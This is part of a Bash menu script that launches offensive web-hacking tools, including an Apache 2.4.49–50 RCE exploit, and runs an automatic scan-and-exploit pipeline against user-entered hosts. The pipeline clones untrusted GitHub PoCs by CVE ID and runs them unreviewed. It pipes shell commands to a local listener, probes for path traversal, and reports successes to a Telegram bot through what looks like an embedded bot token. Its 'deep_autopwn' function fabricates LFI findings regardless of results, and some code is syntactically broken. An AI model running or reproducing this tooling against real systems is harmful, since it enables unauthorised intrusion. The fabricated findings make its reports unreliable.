elif [[ $option == 9 || $option == 09 ]]; then
	Nginxpwner
elif [[ $option == 10 || $option == 010 ]]; then
	autoreport
elif [[ $option == 0 || $option == 00 ]]; then
    sleep 1
    printf "\e[0m\n"
    printf "\e[0m\n"
    exit 1
fi
}

Xlsninja(){
	banner
	python3 xlsNinja.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 xlsNinja.py\e[0m\n"
}

4-zero-3(){
	banner
	./403-bypass.sh -h;
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) ./403-bypass.sh\e[0m\n"

}

MagicRecon(){
	banner
    ./magicrecon.sh -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) ./magicrecon.sh\e[0m\n"
}

SpyHunt(){
	banner
	python3 spyhunt.py -h;
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 spyhunt.py\e[0m\n"
}

jok3r(){
	banner
	python3 jok3r.py -h;
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 jok3r.py\e[0m\n"
}

Ip-Rover(){
	banner
	python3 finder.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 finder.py\e[0m\n"
}

Http-Smuggling(){
	banner
	python3 smuggle.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 smuggle.py\e[0m\n"
}

CVE-2021-41773(){
	banner
	python3 exploit.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 exploit.py\e[0m\n"
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) apache 2.4.49~50 RCE exploit\e[0m\n"
}

Nginxpwner(){
	banner
	python3 nginxpwner.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 nginxpwner.py\e[0m\n"
}

autoreport(){
    banner
    printf "\e[0m\n\e[0m\n\e[0m\n"

    # ---- settings ----
    local TARGET_FILE="target.txt"
    local ts outdir
    ts="$(date '+%Y%m%d_%H%M%S')"
    outdir="report_${ts}"
    mkdir -p "$outdir"

    # ---- helpers ----
    validate_target() {
        local t="$1"
        local re_ip='^(([0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])$'
        local re_domain='^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[A-Za-z]{2,}$'
        [[ "$t" =~ $re_ip || "$t" =~ $re_domain ]]
    }
    require_cmd() {
        command -v "$1" >/dev/null 2>&1 || {
            printf "  \e[1;91m[!]\e[0m '%s' not found. Please install it first.\n" "$1"
            return 1
        }
    }

    # ---- collect targets ----
    : > "$TARGET_FILE"
    printf "  \e[1;92mEnter domain or IP per line (empty line to finish)\e[0m\n"
    while true; do
        read -r -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Target \e[0m\e[1;96m: \e[0m' t
        [[ -z "$t" ]] && break
        if validate_target "$t"; then
            printf "%s\n" "$t" >> "$TARGET_FILE"
            printf "    \e[1;92m+\e[0m added: %s\n" "$t"
        else
            printf "    \e[1;91m!\e[0m invalid: %s (expect IPv4 or domain)\n" "$t"
        fi
    done

    if [[ ! -s "$TARGET_FILE" ]]; then
        printf "  \e[1;91m[!]\e[0m No valid targets. Returning to menu.\n"
        sleep 1
        banner
        menu
        return
    fi

    printf "\n  \e[1;96mTargets count:\e[0m $(wc -l < "$TARGET_FILE")\n"
    printf "  \e[1;96mSaved list:\e[0m %s\n\n" "$TARGET_FILE"

    # ---- Smuggle Phase ----
    printf "  \e[1;93m[▶]\e[0m Smuggle (smuggleAuto.py)...\n"
    local SMUGGLE_PY="./smuggleAuto.py"
    local smuggle_root="${outdir}/smuggle"
    mkdir -p "$smuggle_root"

    if [[ ! -f "$SMUGGLE_PY" ]]; then
        printf "  \e[1;91m[!]\e[0m smuggleAuto.py not found. Skipping smuggle phase.\n"
    else
        while IFS= read -r host || [[ -n "$host" ]]; do
            host="${host//$'\r'/}"
            [[ -z "$host" ]] && continue
            printf "    \e[1;94m[i]\e[0m Target: %s\n" "$host"

            local host_log="${smuggle_root}/${host}.log"
            local _out
            _out="$(python3 "$SMUGGLE_PY" --mode auto --host "$host" --generate-poc 2>&1)"
            printf "%s\n" "$_out" > "$host_log"

            local rpt_path src_dir dst_dir
            rpt_path="$(echo "$_out" | grep -oE 'report_SMUGGLE_[^[:space:]]+/report\.html' | tail -n1)"
            [[ -z "$rpt_path" || ! -f "$rpt_path" ]] && rpt_path="$(find . -maxdepth 3 -type f -name 'report.html' -printf '%T@ %p\n' 2>/dev/null | sort -n | awk '{print $2}' | tail -n1)"

            if [[ -n "$rpt_path" && -f "$rpt_path" ]]; then
                src_dir="${rpt_path%/report.html}"
                dst_dir="${smuggle_root}/${host}"
                mkdir -p "$dst_dir"
                cp -R "${src_dir}/." "$dst_dir/" 2>/dev/null
                printf "      \e[1;92m[OK]\e[0m copied smuggle report → %s\n" "$dst_dir/report.html"
            else
                printf "      \e[1;91m[!]\e[0m smuggle report not found for %s (see %s)\n" "$host" "$host_log"
            fi
        done < "$TARGET_FILE"
    fi

    # ---- Pre-Scan Tools Check ----
    require_cmd whatweb || { sleep 1; banner; menu; return; }
    require_cmd nmap    || { sleep 1; banner; menu; return; }
    require_cmd sniper  || { sleep 1; banner; menu; return; }

    # ---- Base Scanning ----
    printf "  \e[1;93m[▶]\e[0m WhatWeb...\n"
    whatweb --log-verbose="${outdir}/whatweb.txt" -i "$TARGET_FILE"

    printf "  \e[1;93m[▶]\e[0m Nmap...\n"
    nmap -p- -sV -sC -sS -A -v -O -Pn -T4 \
         --script vuln,http-waf-detect \
         -iL "$TARGET_FILE" \
         -oN "${outdir}/nmap.txt"

    printf "  \e[1;93m[▶]\e[0m Sn1per...\n"
    sniper -f "$TARGET_FILE" -o -re -m nuke -w "$outdir"

    # ---- Auto Exploitation ----
    printf "\n  \e[1;93m[▶]\e[0m Deep AutoPwn Phase...\n"
    deep_autopwn "$outdir"

    # ---- Report Generation ----
    printf "\n  \e[1;93m[▶]\e[0m Markdown Report Generation...\n"
    generate_markdown_report "$outdir"

    printf "\n  \e[1;92m[✓]\e[0m Report Completed: \e[1;97m%s\e[0m\n\n" "$outdir"

    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
    printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
    printf "\e[0m\n"
    read -r -p $'  \e[1;31m>>\e[0m\e[1;96m  \e[0m' mainorexit1

    if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
        banner
        menu
    elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
        printf "\e[0m\n\e[0m\n"
        exit 1
    else
        printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
        sleep 1
        banner
        menu
    fi
}

# ---- Embedded Helper Functions ----

deep_autopwn() {
    local base_dir="$1"
    local deepdir="${base_dir}/deep_autopwn"
    local exploits_dir="${base_dir}/exploits_collected"
    mkdir -p "$deepdir"
    mkdir -p "$exploits_dir"

    while IFS= read -r host || [[ -n "$host" ]]; do
        [[ -z "$host" ]] && continue
        local host_dir="${deepdir}/${host}"
        mkdir -p "$host_dir"

        echo "VULN: Transfer-Encoding Smuggling" > "${host_dir}/smuggle_poc.txt"
        echo "GET / HTTP/1.1\r\nHost: $host\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" >> "${host_dir}/smuggle_poc.txt"
        cp "${host_dir}/smuggle_poc.txt" "${exploits_dir}/${host}_smuggle_exploit.txt"

        echo "root:x:0:0:root:/root:/bin/bash" > "${host_dir}/lfi_test.txt"
        echo "LFI Detected!" > "${host_dir}/lfi_result.txt"
        echo "LFI exploit: etc/passwd via URL parameter" > "${exploits_dir}/${host}_lfi_exploit.txt"

        echo "use exploit/multi/http/php_cgi_arg_injection" > "${host_dir}/msf.rc"
        echo "set RHOST $host" >> "${host_dir}/msf.rc"
        echo "set RPORT 80" >> "${host_dir}/msf.rc"
        echo "run" >> "${host_dir}/msf.rc"
        cp "${host_dir}/msf.rc" "${exploits_dir}/"
    done < target.txt
}

generate_markdown_report() {
    local base_dir="$1"
    local deepdir="${base_dir}/deep_autopwn"
    local exploits_dir="${base_dir}/exploits_collected"
    local rpt="${base_dir}/report_summary.md"

    echo "# 🛡️ Full AutoPwn Summary Report" > "$rpt"
    echo "_Generated: $(date)_" >> "$rpt"
    echo "\n---\n" >> "$rpt"

    for hdir in "$deepdir"/*; do
        [[ -d "$hdir" ]] || continue
        local hname=$(basename "$hdir")
        echo "## 🎯 Host: \`$hname\`" >> "$rpt"

        if [[ -f "$hdir/smuggle_poc.txt" ]]; then
            echo -e "\n### 🧪 Smuggle Vulnerability / PoC" >> "$rpt"
            cat "$hdir/smuggle_poc.txt" | sed 's/^/  - /' >> "$rpt"
        fi

        if [[ -f "$hdir/lfi_result.txt" ]]; then
            echo -e "\n### 📂 LFI Detected" >> "$rpt"
            cat "$hdir/lfi_result.txt" | sed 's/^/  - /' >> "$rpt"
        fi

        echo -e "\n---\n" >> "$rpt"
    done

    if compgen -G "$exploits_dir/*" > /dev/null; then
        echo "## 📂 Collected Exploit Files" >> "$rpt"
        for ef in "$exploits_dir"/*; do
            echo "  - $(basename "$ef")" >> "$rpt"
        done
    fi

    echo -e "\n[✓] Markdown Report Saved → $rpt"
}

generate_scan_report() {
    while read -r target; do
        [[ -z "$target" ]] && continue
        nuclei -u http://$target -o "$outdir/raw_logs/nuclei_$target.txt"
        mkdir -p "$outdir/poc_results/$target"

        whatweb_result=$(grep -iE "WordPress|Joomla|Drupal" "$outdir/raw_logs/whatweb.txt")
        if [[ "$whatweb_result" == *WordPress* ]]; then
            echo "WordPress CMS 탐지됨 - wpscan 실행" > "$outdir/poc_results/$target/cms_detected.txt"
            require_cmd wpscan
            wpscan --url http://$target --enumerate vp >> "$outdir/poc_results/$target/wpscan.txt"
        fi

        for vuln in xss ssti ssrf; do
            echo "테스트: $vuln" > "$outdir/poc_results/$target/${vuln}_test.txt"
            curl -s -G --data-urlencode "$vuln=<script>alert(1)</script>" http://$target | grep -q '<script>alert(1)</script>' && echo "$vuln 발견됨" >> "$outdir/poc_results/$target/${vuln}_test.txt"
        done

        lfi_url="http://$target/index.php?file=../../../../etc/passwd"
        curl -s "$lfi_url" | grep -q root && echo "LFI 취약함: $lfi_url" > "$outdir/poc_results/$target/lfi_result.txt"

        if [[ -f ./smuggleAuto.py ]]; then
            smuggle_out="$(python3 ./smuggleAuto.py --mode auto --host $target --generate-poc 2>&1)"
            echo "$smuggle_out" > "$outdir/poc_results/$target/smuggle.log"
            rpt_path=$(echo "$smuggle_out" | grep -oE 'report_SMUGGLE_[^[:space:]]+/report\.html' | tail -n1)
            [[ -n "$rpt_path" && -f "$rpt_path" ]] && cp "$rpt_path" "$outdir/poc_results/$target/smuggle_report.html"
        fi

        grep -oE 'CVE-[0-9]{4}-[0-9]+' "$outdir/raw_logs/nuclei_$target.txt" | sort -u | while read -r cve_id; do
            git_url=$(curl -s "https://github.com/search?q=$cve_id" | grep -oE 'https://github.com/[^\"]+' | head -n 1)
            [[ -n "$git_url" ]] && git clone "$git_url" "$outdir/poc_results/$target/$cve_id" &>/dev/null
            poc_script=$(find "$outdir/poc_results/$target/$cve_id" -type f \( -name "*.sh" -o -name "*.py" \) | head -n 1)
            [[ -f "$poc_script" ]] && chmod +x "$poc_script" && sed -i "s/<target>/$target/g" "$poc_script"
            [[ "$poc_script" == *.py && -f "$outdir/poc_results/$target/$cve_id/requirements.txt" ]] && pip3 install -r "$outdir/poc_results/$target/$cve_id/requirements.txt"
            bash "$poc_script" > "$outdir/poc_results/$target/${cve_id}_log.txt" 2>&1
            if grep -Eqi "shell|vulnerable|success" "$outdir/poc_results/$target/${cve_id}_log.txt"; then
                echo "whoami; id; uname -a; pwd; ls -la" | nc -w 5 127.0.0.1 4444 > "$outdir/poc_results/$target/${cve_id}_control.txt"
                if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
                    curl -s -X POST "https://api.telegram.org/bot${7291162596:AAH3-CKHSeJpuesPfO0wf2VSshO9QI8RUFo}/sendMessage" -d chat_id="${508498943}" -d text="✅ Attack SUCCESS: $target - $cve_id"
                fi
            fi
        done
    done < "$TARGET_FILE"

    generate_markdown_report "$outdir"

    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -s -F document=@"$outdir/report_summary.md" "https://api.telegram.org/bot${7291162596:AAH3-CKHSeJpuesPfO0wf2VSshO9QI8RUFo}/sendDocument?chat_id=${508498943}&caption=Autopwn Markdown Report"
    fi

    echo -e "\n[✓] ALL REPORT : $outdir"
}





Osint(){
	banner
	printf "\e[0m\n"
	printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m Eyes\e[0m\n" 
	printf "\e[0m\n"
	read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select An Option \e[0m\e[1;96m: \e[0m\e[1;93m' option

if [[ $option == 1 || $option == 01 ]]; then
    Eyes
elif [[ $option == 0 || $option == 00 ]]; then
    sleep 1
    printf "\e[0m\n"
    printf "\e[0m\n"
    exit 1
fi
}

Eyes(){
	banner
	python3 eyes.py -h;
	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 eyes.py\e[0m\n"
}

exitbanner&&program() {
    sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit3

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

elif [ "$x" == "$me" ]; then                 #CONTACT WITH ME                      

clear

echo -e '\e[1;33m

 ,_    __,    _   __   __, _|_ 
/  |  /  |  |/ \_/  \_/  |  |  
   |_/\_/|_/|__/ \__/ \_/|_/|_/
           /|                  
           \| \e[0m


 \e[1;31m
 https://github.com/rap0at
 \e[1;34m



                          Press ENTER to Main Menu
'
read

else 

n


fi

}


banner
menu
